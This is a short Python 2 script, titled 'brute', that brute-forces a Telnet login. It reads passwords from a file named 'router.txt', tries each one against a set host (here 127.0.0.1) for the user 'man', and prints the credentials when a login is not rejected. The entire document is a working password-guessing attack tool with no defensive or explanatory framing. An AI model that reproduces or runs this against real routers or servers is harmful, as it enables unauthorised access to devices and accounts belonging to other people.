# brute
import sys, os, telnetlib

#
USER_LABEL = "login:"
PASS_LABEL = "Password:"
ERROR_RESPONSE = "incorrect"
#

def login(host, user, password):
        Tel = telnetlib.Telnet(host)
        print "* Testing for %s..." %password
        Tel.read_until(USER_LABEL)
        Tel.write(user+'\n')
        Tel.read_until(PASS_LABEL)
        Tel.write(password+'\n')

        error = Tel.read_until(ERROR_RESPONSE)
        if(error.find(ERROR_RESPONSE) != -1):
                print ("\t[-] %s" %ERROR_RESPONSE)
        else:
                print "[+]Find Password!!"
                print "\t uesr:%s" %user
                print "\t pass:%s" %password
                exit(0)

pw_file = open("router.txt", 'r')

passwords = pw_file.readlines()
pw_file.close()

host = "127.0.0.1"      # IP
user = "man"

for password in passwords:
        password = password.strip('\n')
        login(host, user, password)
